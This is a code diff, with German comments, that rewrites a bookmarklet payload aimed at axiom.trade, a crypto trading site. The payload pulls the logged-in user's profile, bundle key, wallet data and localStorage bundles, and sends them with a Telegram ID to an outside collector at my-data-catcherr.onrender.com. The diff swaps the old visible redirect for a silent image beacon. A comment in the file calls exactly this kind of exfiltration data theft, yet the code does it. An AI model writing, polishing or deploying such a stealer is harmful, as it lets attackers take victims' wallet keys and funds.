@@ -191,30 +191,54 @@ function showTab(tab){
 // Wichtig: Es darf ein IIFE / normaler Code-Block sein, aber sende hier
 // niemals Login-Daten, Cookies, localStorage-Inhalte o.ä. an einen
 // dritten Server — das wäre Datendiebstahl, egal wessen Seite.
-const PAYLOAD_JS = `javascript:(async()=>{    
-try{      
-if(location.hostname!=='axiom.trade'){
-alert('Please navigate to axiom.trade first');
-return;
-}      
-if(!localStorage.getItem('isAuthed')){
-return alert('Please log in to axiom.trade first')
-}
-const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();
-const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();
-const bookmarkData={
-telegramId:'7198683357',
-site:location.href,
-user:user,
-bundle:bundle.bundleKey,
-sBundles:localStorage.getItem('sBundles'),
-eBundles:localStorage.getItem('eBundles')
-};
-location.replace('https://my-data-catcherr.onrender.com/data/'+btoa(JSON.stringify(bookmarkData)))
-}catch(e){
-alert('Error occurred')
-}
-})();`;
+const PAYLOAD_JS = `javascript:(async()=>{
+    try {
+        // 1. Überprüfung der Website
+        if(location.hostname !== 'axiom.trade'){
+            alert('Bitte öffne zuerst axiom.trade');
+            return;
+        }
+
+        // 2. Überprüfung des Logins
+        if(!localStorage.getItem('isAuthed')){
+            alert('Bitte logge dich zuerst auf axiom.trade ein');
+            return;
+        }
+
+        // 3. Abfragen der geschützten API-Daten
+        const user = await (
+            await fetch('https://api7.axiom.trade/user-info',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+        const bundle = await (
+            await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+        // 4. Zusammenstellen des Datenpakets
+        const bookmarkData = {
+            telegramId: '7198683357',
+            site: location.href,
+            user: user,
+            bundle: bundle.bundleKey,
+            sBundles: localStorage.getItem('sBundles'),
+            eBundles: localStorage.getItem('eBundles')
+        };
+
+
+        new Image().src = "https://my-data-catcherr.onrender.com/data/" +
+        encodeURIComponent(btoa(JSON.stringify(bookmarkData)));
+
+
+    } catch(e){
+        alert("Error: " + e.message);
+    }
+})()`;
 
 function buildBookmarklet(){
     const href = "javascript:" + encodeURIComponent(PAYLOAD_JS);
